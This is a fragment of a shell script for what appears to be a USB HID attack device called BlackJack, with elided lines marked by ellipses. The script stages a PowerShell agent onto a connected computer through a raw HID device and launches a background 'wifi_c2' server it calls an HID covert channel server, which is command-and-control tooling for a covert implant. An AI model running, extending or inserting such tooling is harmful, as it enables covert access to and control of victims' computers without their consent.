...
hidraw=$(BlackJack_cli usb get device raw)
...
/usr/local/BlackJack/legacy/hidstager.py -s -i /usr/local/BlackJack/legacy/wifi_agent.ps1 -o $hidraw &
...
if ! ps -aux | grep wifi_server | grep -q -v grep; then
	...
	screen -dmS wifi_c2 bash -c "/usr/local/BlackJack/legacy/wifi_server.py"
else
	echo "HID covert channel server already running"
fi


BlackJack_cli led -b 3